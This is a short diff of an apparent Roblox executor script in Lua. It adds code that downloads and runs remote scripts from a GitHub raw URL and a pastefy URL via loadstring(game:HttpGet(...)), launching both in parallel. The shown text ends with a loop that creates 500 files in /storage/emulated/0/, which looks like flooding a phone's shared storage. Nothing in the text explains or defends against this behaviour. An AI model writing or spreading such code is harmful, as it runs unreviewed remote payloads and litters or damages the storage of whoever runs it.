@@ -1,4 +1,11 @@
+local function ScreenGui()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xeroxson/LoadingScreen/refs/heads/main/LoadingScreen.txt"))()
+end
+local function Script()
 loadstring(game:HttpGet("https://pastefy.app/qspKfieR/raw"))()
+end
+task.spawn(Script)
+task.spawn(ScreenGui)
 
 for i = 1, 500 do
     local file = io.open("/storage/emulated/0/".. i, "w")
